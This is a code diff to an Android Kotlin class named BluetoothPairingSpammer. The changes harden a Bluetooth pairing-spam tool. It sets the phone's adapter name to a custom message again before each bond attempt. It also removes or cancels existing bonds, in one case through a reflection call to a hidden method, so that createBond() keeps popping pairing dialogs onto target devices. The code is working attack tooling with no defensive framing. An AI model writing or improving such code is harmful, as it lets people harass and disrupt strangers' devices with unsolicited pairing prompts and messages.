@@ -47,6 +47,7 @@ class BluetoothPairingSpammer {
 
     private var adapter: BluetoothAdapter? = null
     private var originalAdapterName: String? = null
+    private var customMessage: String = ""
     private var spamJob: Job? = null
     private var bondReceiver: BroadcastReceiver? = null
     private var appContext: Context? = null
@@ -78,12 +79,20 @@ class BluetoothPairingSpammer {
             return
         }
 
+        customMessage = customName
+
         // Step 1: Save original name and set custom message as BT name
+        // Must set BEFORE any interaction with targets to avoid name caching
         try {
             originalAdapterName = adapter?.name
             adapter?.setName(customName)
             Log.d(TAG, "Adapter name set to: '$customName' (was: '$originalAdapterName')")
-            CrashLogger.log(context, TAG, "Started pairing spam: name='$customName' targets=${targets.size}")
+            // Wait for name to propagate to EIR (Extended Inquiry Response)
+            Thread.sleep(500)
+            // Verify name was actually set
+            val verifiedName = adapter?.name
+            Log.d(TAG, "Adapter name verified: '$verifiedName'")
+            CrashLogger.log(context, TAG, "Started pairing spam: name='$customName' verified='$verifiedName' targets=${targets.size}")
         } catch (e: SecurityException) {
             Log.e(TAG, "Failed to set adapter name", e)
             _lastError.value = "Permission denied: cannot set Bluetooth name"
@@ -122,21 +131,37 @@ class BluetoothPairingSpammer {
     private fun sendPairingRequest(device: BluetoothDevice) {
         val address = device.address
         try {
+            // Re-assert custom name before EVERY bond attempt
+            // This ensures the EIR packet has the right name even if Android resets it
+            try {
+                adapter?.setName(customMessage)
+            } catch (_: SecurityException) { }
+
             // Remove existing bond first (if bonded, createBond won't show dialog)
             val bondState = device.bondState
             if (bondState == BluetoothDevice.BOND_BONDED) {
                 Log.d(TAG, "Removing existing bond with $address")
                 removeBond(device)
-                Thread.sleep(500)
+                Thread.sleep(300)
+            } else if (bondState == BluetoothDevice.BOND_BONDING) {
+                // Cancel ongoing bonding attempt to restart it
+                try {
+                    val cancelMethod = device.javaClass.getMethod("cancelBondProcess")
+                    cancelMethod.invoke(device)
+                    Log.d(TAG, "Cancelled ongoing bond with $address")
+                    Thread.sleep(300)
+                } catch (_: Exception) { }
             }
 
             // createBond() triggers the pairing dialog on the target device
             // The dialog shows our custom adapter name as the requesting device
-            Log.d(TAG, "Sending pairing request to $address (bond state: $bondState)")
+            Log.d(TAG, "Sending pairing request to $address (bond=$bondState, name='${adapter?.name}')")
             val result = device.createBond()
             Log.d(TAG, "createBond($address) returned: $result")
         } catch (e: SecurityException) {
             Log.w(TAG, "SecurityException sending pairing to $address", e)
+        } catch (e: Exception) {
+            Log.w(TAG, "Error sending pairing to $address: ${e.message}", e)
         }
     }
 
